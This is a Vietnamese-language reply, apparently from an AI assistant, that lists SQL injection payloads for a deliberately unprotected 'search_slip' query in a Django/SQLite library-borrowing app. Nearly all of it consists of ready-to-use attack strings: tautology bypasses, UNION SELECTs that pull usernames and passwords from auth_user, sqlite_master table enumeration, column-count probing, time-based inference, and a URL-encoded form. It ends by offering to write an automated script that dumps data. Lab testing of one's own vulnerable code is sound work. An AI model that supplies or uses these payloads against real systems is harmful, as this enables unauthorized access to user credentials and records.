Dưới đây là **danh sách đầy đủ các payload SQL Injection** bạn có thể thử với chức năng `search_slip` đã chỉnh sửa ở trên (truy vấn SQL thô, không được bảo vệ). Mục tiêu của các payload này là **đọc thông tin của các phiếu mượn mà không cần là librarian**, thậm chí thực thi các truy vấn độc hại nếu database cho phép.

---

## ✅ 1. **Payload cơ bản**
```sql
' OR 1=1 --
```
✔ Trả về toàn bộ `borrow_borrowslip`

```sql
' OR 'a'='a --
```

```sql
' OR ''='' --
```

---

## ✅ 2. **Payload để liệt kê thông tin người dùng**
(Nếu có `JOIN` hoặc hiển thị `username`, `email`...)

```sql
' UNION SELECT id, username, password, email, 1, 1, 1 FROM auth_user --
```

---

## ✅ 3. **Tìm tên bảng (dành cho SQLite)**
```sql
' UNION SELECT name, '', '', '', '', '', '', '' FROM sqlite_master WHERE type='table' --
```

---

## ✅ 4. **Đọc dữ liệu từ bảng `auth_user`**
(Nếu số cột khớp với `borrow_borrowslip`)

```sql
' UNION SELECT id, username, '', '', '', '', '', '' FROM auth_user --
```

---

## ✅ 5. **Tấn công logic (bypass quyền user thường)**
```sql
' OR user_id IS NOT NULL --
```

```sql
' OR user_id IN (SELECT id FROM auth_user) --
```

---

## ✅ 6. **Gây lỗi để dò cấu trúc**
```sql
' AND 1=0 UNION SELECT NULL --
```

```sql
' AND 1=0 UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL --
```

✔ Dò số lượng cột thông qua lỗi `OperationalError: SELECTs to the left and right of UNION do not have the same number of result columns`

---

## ✅ 7. **SQLite version (nếu được in ra)**
```sql
' UNION SELECT sqlite_version(), '', '', '', '', '', '', '' --
```

---

## ✅ 8. **Tấn công bằng kiểu thời gian (time-based inference)**
SQLite không có `SLEEP()` như MySQL, nhưng bạn có thể dùng truy vấn nặng để "delay" phản hồi (trong thực tế, hiệu quả hạn chế):

```sql
' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master AS t2, sqlite_master AS t3) > 0 --
```

---

## ✅ 9. **Payload phá vỡ logic truy vấn**
```sql
' AND 1=2 --
```

```sql
' HAVING 1=1 --
```

---

## ✅ 10. **Payload khai thác kiểu dữ liệu boolean**
```sql
' OR submitted=1 --
```

```sql
' OR is_borrowed=1 --
```

---

## ✅ Kết hợp với encode (URL-encoded)
Khi gửi từ trình duyệt:

```http
?q_slip=%27%20OR%201%3D1%20--%20
```

---

## ❗ Ghi chú kỹ thuật:

- Vì bạn dùng **SQLite** (`sqlite3` là mặc định trong Django nếu chưa cấu hình), cú pháp khác so với MySQL/PostgreSQL.
- SQLite không hỗ trợ `LIMIT` trong `UNION SELECT` nếu có `ORDER BY` ngoài.
- Không có `@@version`, `information_schema`, `sleep()` như MySQL.

---

## 📌 Gợi ý khai thác cụ thể:
Nếu bạn có template đang render `slip.user_id` hoặc có `JOIN` với `auth_user`, payload sau giúp **xem thông tin user khác**:

```sql
' UNION SELECT id, username, '', '', '', '', '', '' FROM auth_user --
```

---

Nếu bạn cần mình **viết script tự động khai thác** các payload trên để dump dữ liệu hoặc tạo công cụ kiểm tra, mình có thể hỗ trợ thêm. Bạn muốn dùng Python hay Burp Suite Repeater?